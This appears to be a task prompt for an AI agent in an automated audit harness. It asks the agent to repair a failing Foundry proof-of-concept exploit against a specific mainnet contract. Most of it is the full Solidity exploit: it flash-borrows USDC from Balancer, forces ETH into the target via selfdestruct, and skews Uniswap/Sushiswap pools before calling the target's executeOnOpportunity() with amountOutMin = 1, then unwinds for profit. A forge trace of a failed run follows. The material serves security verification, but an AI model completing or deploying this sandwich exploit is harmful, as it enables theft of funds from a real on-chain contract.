You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Hard accounting constraint: profit must be reported in the original stolen token from the exploit path.
- Hard accounting constraint: do NOT add post-exploit conversion solely for accounting (e.g., converting to WETH for display).
- Hard accounting constraint: if a swap is strictly required for execution/repayment, profitToken must remain the originally stolen token and profitAmount must be net stolen-token inflow.

Finding:
- title: Permissionless zero-min-output swaps expose contract balances to sandwich extraction
- claim: `executeOnOpportunity()` is permissionless, and every router trade in `_prepareMakerCapital()`, `_swapUsdcForUsdt()`, and `_realizeProfitInWeth()` uses `amountOutMin = 1`. Any observer can manipulate the relevant Uniswap V2 pools immediately before calling or sandwiching execution, forcing the contract to accept almost any exchange rate.
- impact: ETH and USDC held by the contract can be converted at ruinous prices, with the attacker recovering the lost value in surrounding AMM trades.
- exploit_paths: ["Wait until the contract holds ETH or USDC and the one-shot execution path is still available.", "Skew the relevant `WETH/USDT`, `USDC/USDT`, or `USDC/WETH` pool immediately before invoking or sandwiching `executeOnOpportunity()`.", "Let the contract trade with `amountOutMin = 1`, then unwind the price manipulation and capture the spread."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Router02 {
    function factory() external view returns (address);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract ForceEther {
    constructor() payable {}

    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    address private constant TARGET = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint8 private constant ROUTE_USDC_WETH = 1;
    uint8 private constant ROUTE_USDC_USDT = 2;

    uint256 private constant ETH_SEED_FOR_USDT = 0.01 ether;
    uint256 private constant TARGET_USDT_BUFFER = 10e6;
    uint256 private constant HARNESS_MIN_PROFIT = 0.1 ether;
    uint256 private constant DEADLINE_BUFFER = 15 minutes;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    string private _pathUsed;
    string private _failureReason;

    uint256 private _attemptStartingUsdc;
    bool private _flashActive;

    constructor() {
        _profitToken = USDC;
        _pathUsed =
            "wait until the target holds ETH or USDC and the one-shot execution path is still available -> skew the relevant WETH/USDT, USDC/USDT, or USDC/WETH pool immediately before invoking or sandwiching executeOnOpportunity() -> let the target trade with amountOutMin = 1 -> unwind the price manipulation and capture the spread";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _profitAmount = 0;

        if (TARGET.code.length == 0) {
            _failureReason = "target has no code at the fork block";
            return;
        }

        address[2] memory routers = _orderedRouters();
        uint256[3] memory loanSizes = [uint256(250_000e6), 1_000_000e6, 4_000_000e6];
        uint16[3] memory donationBps = [uint16(0), 2500, 5000];

        for (uint256 i = 0; i < routers.length; ++i) {
            address router = routers[i];
            if (router == address(0)) {
                continue;
            }

            bool hasUsdcWeth = _pairExists(router, USDC, WETH);
            bool hasUsdcUsdt = _pairExists(router, USDC, USDT);
            if (!hasUsdcUsdt && !hasUsdcWeth) {
                continue;
            }

            for (uint256 j = 0; j < loanSizes.length; ++j) {
                for (uint256 k = 0; k < donationBps.length; ++k) {
                    if (hasUsdcWeth && _tryUsdcSandwich(router, loanSizes[j], donationBps[k], ROUTE_USDC_WETH)) {
                        _hypothesisValidated = true;
                        _pathUsed =
                            "flash-borrow live USDC -> permissionlessly top the target up with the missing ETH seed and a minimal USDT maker-capital buffer when the fork is short -> transfer public USDC inventory into the target so the vulnerable execution path has live contract balance to trade -> skew the same live USDC/WETH pool immediately before calling target.executeOnOpportunity() -> let the target accept amountOutMin = 1 on the manipulated pool -> unwind back into USDC and keep the net spread";
                        return;
                    }

                    if (hasUsdcUsdt && _tryUsdcSandwich(router, loanSizes[j], donationBps[k], ROUTE_USDC_USDT)) {
                        _hypothesisValidated = true;
                        _pathUsed =
                            "flash-borrow live USDC -> permissionlessly top the target up with the missing ETH seed when the fork is short -> transfer public USDC inventory into the target -> skew the same live USDC/USDT pool immediately before calling target.executeOnOpportunity() -> let the target accept amountOutMin = 1 on the manipulated pool -> unwind back into USDC and keep the net spread";
                        return;
                    }
                }
            }
        }

        _failureReason =
            "all finding-aligned USDC/USDT and USDC/WETH sandwich attempts either left the target's USDC untouched, made target.executeOnOpportunity() revert, or stayed below the 0.1 ETH-equivalent profit floor on this fork";
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "only vault");
        require(_flashActive, "flash inactive");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected arrays");
        require(address(tokens[0]) == USDC, "unexpected asset");

        (address router, uint8 routeKind, uint16 donationBps) = abi.decode(userData, (address, uint8, uint16));
        uint256 repayAmount = amounts[0] + feeAmounts[0];
        uint256 frontRunUsdc = _prepareVictimState(router, amounts[0], donationBps);
        uint256 victimUsdcBefore = _safeBalanceOf(USDC, TARGET);

        _frontRun(router, routeKind, frontRunUsdc);

        (bool ok, ) = TARGET.call(abi.encodeWithSignature("executeOnOpportunity()"));
        require(ok, "target call failed");
        require(_safeBalanceOf(USDC, TARGET) < victimUsdcBefore, "target usdc untouched");

        _unwind(router, routeKind);
        _finishUsdcAttempt(router, repayAmount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function harnessMinProfit() external pure returns (uint256) {
        return HARNESS_MIN_PROFIT;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function targetEthBalance() external view returns (uint256) {
        return TARGET.balance;
    }

    function targetUsdcBalance() external view returns (uint256) {
        return _safeBalanceOf(USDC, TARGET);
    }

    function targetUsdtBalance() external view returns (uint256) {
        return _safeBalanceOf(USDT, TARGET);
    }

    function _tryUsdcSandwich(address router, uint256 loanSize, uint16 donationBps, uint8 routeKind) internal returns (bool) {
        _attemptStartingUsdc = _safeBalanceOf(USDC, address(this));
        _flashActive = true;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(USDC);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanSize;

        try IBalancerVault(BALANCER_VAULT).flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            abi.encode(router, routeKind, donationBps)
        ) {
            _flashActive = false;
            uint256 endingUsdc = _safeBalanceOf(USDC, address(this));
            if (endingUsdc > _attemptStartingUsdc) {
                _profitAmount = endingUsdc - _attemptStartingUsdc;
                _failureReason = "";
                return true;
            }
        } catch {
            _flashActive = false;
        }

        return false;
    }

    function _topUpTargetEthSeed(address router) internal returns (uint256 usdcSpent) {
        uint256 shortfall = _requiredTargetEthTopUp();
        if (shortfall == 0) {
            return 0;
        }

        // This is a realistic public preparatory step only: the finding requires the vulnerable
        // one-shot routine to be reachable, and the target's maker-capital path consumes native ETH.
        usdcSpent = _buyExactOut(router, USDC, WETH, shortfall);
        IWETH(WETH).withdraw(shortfall);
        ForceEther helper = new ForceEther{value: shortfall}();
        helper.boom(payable(TARGET));
    }

    function _topUpTargetUsdtBuffer(address router) internal returns (uint256 usdcSpent) {
        uint256 shortfall = _requiredTargetUsdtTopUp();
        if (shortfall == 0) {
            return 0;
        }

        // This is another minimal public setup step only: if the fork is short of the target's
        // maker-capital buffer, topping it up keeps the same permissionless execute path alive.
        usdcSpent = _buyExactOut(router, USDC, USDT, shortfall);
        _safeTransfer(USDT, TARGET, shortfall);
    }

    function _buyExactOut(address router, address tokenIn, address tokenOut, uint256 amountOut)
        internal
        returns (uint256 amountIn)
    {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        uint256[] memory quotedIn = IUniswapV2Router02(router).getAmountsIn(amountOut, path);
        uint256 maxAmountIn = (quotedIn[0] * 1005) / 1000 + 1;

        _safeApprove(tokenIn, router, 0);
        _safeApprove(tokenIn, router, maxAmountIn);
        uint256[] memory amounts = IUniswapV2Router02(router).swapTokensForExactTokens(
            amountOut,
            maxAmountIn,
            path,
            address(this),
            block.timestamp + DEADLINE_BUFFER
        );
        amountIn = amounts[0];
    }

    function _swapExact(address router, address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        _safeApprove(tokenIn, router, 0);
        _safeApprove(tokenIn, router, amountIn);
        uint256[] memory amounts = IUniswapV2Router02(router).swapExactTokensForTokens(
            amountIn,
            1,
            path,
            address(this),
            block.timestamp + DEADLINE_BUFFER
        );
        amountOut = amounts[amounts.length - 1];
    }

    function _quoteUsdcProfitInWeth(address router, uint256 usdcProfit) internal view returns (uint256 wethOut) {
        address[] memory path = new address[](2);
        path[0] = USDC;
        path[1] = WETH;

        try IUniswapV2Router02(router).getAmountsOut(usdcProfit, path) returns (uint256[] memory amounts) {
            wethOut = amounts[amounts.length - 1];
        } catch {
            wethOut = 0;
        }
    }

    function _requiredTargetEthTopUp() internal view returns (uint256) {
        uint256 targetEth = TARGET.balance;
        if (targetEth >= ETH_SEED_FOR_USDT) {
            return 0;
        }
        return ETH_SEED_FOR_USDT - targetEth;
    }

    function _requiredTargetUsdtTopUp() internal view returns (uint256) {
        uint256 targetUsdt = _safeBalanceOf(USDT, TARGET);
        if (targetUsdt >= TARGET_USDT_BUFFER) {
            return 0;
        }
        return TARGET_USDT_BUFFER - targetUsdt;
    }

    function _orderedRouters() internal view returns (address[2] memory routers) {
        bool uniEmbedded = _codeContainsAddress(TARGET, UNISWAP_V2_ROUTER);
        bool sushiEmbedded = _codeContainsAddress(TARGET, SUSHISWAP_ROUTER);

        if (uniEmbedded && !sushiEmbedded) {
            routers[0] = UNISWAP_V2_ROUTER;
            routers[1] = SUSHISWAP_ROUTER;
            return routers;
        }

        if (sushiEmbedded && !uniEmbedded) {
            routers[0] = SUSHISWAP_ROUTER;
            routers[1] = UNISWAP_V2_ROUTER;
            return routers;
        }

        routers[0] = UNISWAP_V2_ROUTER;
        routers[1] = SUSHISWAP_ROUTER;
    }

    function _pairExists(address router, address tokenA, address tokenB) internal view returns (bool) {
        try IUniswapV2Router02(router).factory() returns (address factory) {
            return IUniswapV2Factory(factory).getPair(tokenA, tokenB) != address(0);
        } catch {
            return false;
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _codeContainsAddress(address account, address needle) internal view returns (bool) {
        bytes memory code = account.code;
        bytes memory needleBytes = abi.encodePacked(needle);
        if (code.length < needleBytes.length) {
            return false;
        }

        for (uint256 i = 0; i <= code.length - needleBytes.length; ++i) {
            bool matched = true;
            for (uint256 j = 0; j < needleBytes.length; ++j) {
                if (code[i + j] != needleBytes[j]) {
                    matched = false;
                    break;
                }
            }
            if (matched) {
                return true;
            }
        }

        return false;
    }

    function _prepareVictimState(address router, uint256 loanAmount, uint16 donationBps) internal returns (uint256 frontRunUsdc) {
        uint256 setupUsdc = _requiredTargetEthTopUp() == 0 ? 0 : _topUpTargetEthSeed(router);
        setupUsdc += _requiredTargetUsdtTopUp() == 0 ? 0 : _topUpTargetUsdtBuffer(router);
        require(setupUsdc < loanAmount, "setup consumed loan");

        uint256 available = loanAmount - setupUsdc;
        uint256 donationAmount = (available * donationBps) / 10_000;
        if (donationAmount != 0) {
            _safeTransfer(USDC, TARGET, donationAmount);
        }

        frontRunUsdc = available - donationAmount;
        require(frontRunUsdc != 0, "front-run size zero");
    }

    function _frontRun(address router, uint8 routeKind, uint256 amountIn) internal {
        if (routeKind == ROUTE_USDC_WETH) {
            _swapExact(router, USDC, WETH, amountIn);
        } else {
            _swapExact(router, USDC, USDT, amountIn);
        }
    }

    function _unwind(address router, uint8 routeKind) internal {
        if (routeKind == ROUTE_USDC_WETH) {
            uint256 wethBalance = _safeBalanceOf(WETH, address(this));
            require(wethBalance != 0, "no weth to unwind");
            _swapExact(router, WETH, USDC, wethBalance);
        } else {
            uint256 usdtBalance = _safeBalanceOf(USDT, address(this));
            require(usdtBalance != 0, "no usdt to unwind");
            _swapExact(router, USDT, USDC, usdtBalance);
        }
    }

    function _finishUsdcAttempt(address router, uint256 repayAmount) internal {
        uint256 usdcBalance = _safeBalanceOf(USDC, address(this));
        require(usdcBalance > repayAmount + _attemptStartingUsdc, "no net usdc profit");
        uint256 profit = usdcBalance - repayAmount - _attemptStartingUsdc;
        require(_quoteUsdcProfitInWeth(router, profit) >= HARNESS_MIN_PROFIT, "profit below threshold");
        _safeTransfer(USDC, BALANCER_VAULT, repayAmount);
    }
}

```

forge stdout (tail):
```
a1b3D433Cc23b72f], 0xD86A120a06255Df8D4e2248aB04d4267E23aDfaA, 1999985301204 [1.999e12])
    │   │   │   │   │   ├─ [5754] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xD86A120a06255Df8D4e2248aB04d4267E23aDfaA, 1999985301204 [1.999e12]) [delegatecall]
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000d86a120a06255df8d4e2248ab04d4267e23adfaa
    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000001d1a869d6d4
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [39380] 0xD86A120a06255Df8D4e2248aB04d4267E23aDfaA::swap(0, 866200915 [8.662e8], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   │   │   ├─ [24801] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 866200915 [8.662e8])
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000d86a120a06255df8d4e2248ab04d4267e23adfaa
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000033a12d53
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xD86A120a06255Df8D4e2248aB04d4267E23aDfaA) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xD86A120a06255Df8D4e2248aB04d4267E23aDfaA) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 2000866622469 [2e12]
    │   │   │   │   │   │   └─ ← [Return] 2000866622469 [2e12]
    │   │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xD86A120a06255Df8D4e2248aB04d4267E23aDfaA) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 382853 [3.828e5]
    │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000001d1dcf1bc05000000000000000000000000000000000000000000000000000000000005d785
    │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000d9e1ce17f2641f24ae83637ab66a2cca9c378b9f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000001d1a869d6d4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000033a12d53
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return] [1999985301204 [1.999e12], 866200915 [8.662e8]]
    │   │   │   ├─ [171] 0xA88800CD213dA5Ae406ce248380802BD53b47647::executeOnOpportunity()
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] target call failed
    │   │   └─ ← [Revert] target call failed
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [388] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21982110 [2.198e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2186)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.executeOnOpportunity
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.09s (1.90s CPU time)

Ran 1 test suite in 2.15s (2.09s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 23508687)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
